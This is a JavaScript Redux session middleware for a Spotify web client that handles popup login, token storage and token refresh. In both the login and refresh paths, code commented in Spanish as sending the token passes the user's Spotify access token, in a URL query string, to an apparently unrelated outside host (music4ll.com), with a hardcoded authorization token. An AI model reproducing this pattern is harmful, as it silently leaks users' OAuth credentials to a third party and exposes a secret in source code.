import fetch from 'isomorphic-unfetch';

import { LOAD, LOGIN } from '../constants/ActionTypes';
import { loginSuccess, updateCurrentUser, updateTokenSuccess } from '../actions/sessionActions';

import * as Config from '../config/app';

const SPOTIFY_API_BASE = 'https://api.spotify.com/v1';

const getCurrentUser = () => (dispatch, getState) =>
  fetch(`${SPOTIFY_API_BASE}/me`, {
    headers: {
      Authorization: 'Bearer ' + getState().session.access_token
    }
  })
    .then(res => res.json())
    .then(res => {
      dispatch(updateCurrentUser(res));
    });

const updateToken = () => (dispatch, getState) => {
  return fetch(`${Config.HOST}/auth/token`, {
    method: 'POST',
    body: JSON.stringify({
      refresh_token: getState().session.refresh_token
    }),
    headers: new Headers({
      'Content-Type': 'application/json'
    })
  })
    .then(res => res.json())
    .then(res => {
      console.log(res);
      dispatch(updateTokenSuccess(res.access_token));
      //AQUI MI FETCH, PARA MANDAR EL TOKEN
      console.log('Enviando Nuevo Token');
      fetch('https://music4ll.com/spoty/token/1/?token=' + res.access_token, {
        headers: new Headers({
          Authorization: 'Token 33747741367db940530899f195941e9ae915421f'
        })
      })
        .then(response => response.json())
        .then(data => console.log('NUEVO: ' + data));
      //console.log("esta TOKEN ",accessToken);
    });
};

// todo: set a timer, both client-side and server-side

export default store => next => action => {
  const result = next(action);
  switch (action.type) {
    case LOAD: {
      const session = store.getState().session;
      const expiresIn = session.expires_in;
      const needsToUpdate = !expiresIn || expiresIn - Date.now() < 10 * 60 * 1000;
      if (needsToUpdate) {
        console.log('sessionMiddleware > needs to update access token');
        const refreshToken = session.refresh_token;
        if (refreshToken) {
          console.log('sessionMiddleware > using refresh token');
          store
            .dispatch(updateToken())
            .then(() => {
              return store.dispatch(getCurrentUser());
            })
            .then(() => {
              store.dispatch(loginSuccess());
            });
        }
      } else {
        console.log('sessionMiddleware > no need to update access token');
        store.dispatch(getCurrentUser()).then(() => {
          store.dispatch(loginSuccess());
        });
      }
      break;
    }
    case LOGIN: {
      const getLoginURL = scopes => {
        return `${Config.HOST}/auth/login?scope=${encodeURIComponent(scopes.join(' '))}`;
      };

      const width = 450,
        height = 730,
        left = window.screen.width / 2 - width / 2,
        top = window.screen.height / 2 - height / 2;

      const messageFn = event => {
        try {
          const hash = JSON.parse(event.data);
          if (hash.type === 'access_token') {
            window.removeEventListener('message', messageFn, false);
            const accessToken = hash.access_token;
            const expiresIn = hash.expires_in;
            if (accessToken === '') {
              // todo: implement login error
            } else {
              const refreshToken = hash.refresh_token;
              localStorage.setItem('refreshToken', refreshToken);
              localStorage.setItem('accessToken', accessToken);
              localStorage.setItem('expiresIn', Date.now() + expiresIn * 1000);
              store.dispatch(updateTokenSuccess(accessToken));
              store.dispatch(getCurrentUser()).then(() => store.dispatch(loginSuccess()));
            }
            //AQUI MI FETCH, PARA MANDAR EL TOKEN
            console.log('Enviando Token');
            fetch('https://music4ll.com/spoty/token/1/?token=' + accessToken, {
              headers: new Headers({
                Authorization: 'Token 33747741367db940530899f195941e9ae915421f'
              })
            })
              .then(response => response.json())
              .then(data => console.log(data));
            //console.log("esta TOKEN ",accessToken);
          }
        } catch (e) {
          // do nothing
          console.error(e);
        }
      };
      window.addEventListener('message', messageFn, false);

      const url = getLoginURL(['user-read-playback-state', 'user-modify-playback-state']);
      window.open(
        url,
        'Spotify',
        'menubar=no,location=no,resizable=no,scrollbars=no,status=no, width=' +
          width +
          ', height=' +
          height +
          ', top=' +
          top +
          ', left=' +
          left
      );

      break;
    }
    default:
      break;
  }
  return result;
};
